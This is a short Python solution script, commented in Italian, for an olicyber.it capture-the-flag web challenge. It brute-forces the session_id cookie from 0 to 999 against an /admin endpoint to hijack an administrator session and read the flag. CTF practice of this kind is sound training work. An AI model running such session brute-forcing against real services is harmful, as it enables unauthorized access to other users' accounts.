# Questa API non sembra far nulla di utile... Scopri i segreti dell'admin!

import requests
url = "http://too-small-reminder.challs.olicyber.it"
s = requests.session()

# praticamente posso registrarmi e loggarmi con qualsiasi username e password
# poi provo a cambiare il cookie session_id con tutti gli id da 0 a 999
# finchè non trovo quello giusto che mi fa vedere la flag

jfiglio = { 
    "username" : "privitorta", 
    "password" : "ilovewebctf" 
}

registrazione = s.post(f"{url}/register", json = jfiglio)
print(registrazione.text)
login = s.post(f"{url}/login", json = jfiglio)
print(login.text)

for i in range(1000):
    r = requests.get(f"{url}/admin", cookies={"session_id":f"{i}"})
    if "flag" in r.text.lower():
        print(r.text)
        print(f"session_id : {i} corretto")
        break
    else:
        print(f"{r.text}, {i}")